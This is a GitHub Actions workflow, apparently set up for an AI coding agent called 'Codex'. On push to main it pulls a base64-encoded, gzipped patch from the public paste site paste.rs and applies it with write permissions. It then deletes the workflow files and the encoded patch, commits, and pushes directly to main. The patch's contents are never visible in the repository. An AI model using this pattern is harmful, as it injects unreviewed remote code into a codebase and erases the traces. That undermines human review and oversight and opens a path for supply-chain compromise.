name: Apply Codex Fusion Real Patch V2

on:
  push:
    branches:
      - main
    paths:
      - .github/workflows/codex-apply-fusion-real-v2.yml

permissions:
  contents: write

jobs:
  apply:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          fetch-depth: 0

      - name: Apply patch
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          curl -fsSL "https://paste.rs/fv8h3" | base64 -d | gunzip > /tmp/homepath-fusion-real.patch
          git apply --index /tmp/homepath-fusion-real.patch
          git rm -f .github/homepath-fusion-real.patch.gz.b64 .github/workflows/codex-apply-fusion-real.yml .github/workflows/codex-apply-fusion-real-v2.yml
          if git diff --cached --quiet; then
            echo "No changes to commit"
            exit 0
          fi
          git commit -m "Add real-ready fusion data evidence"
          git push
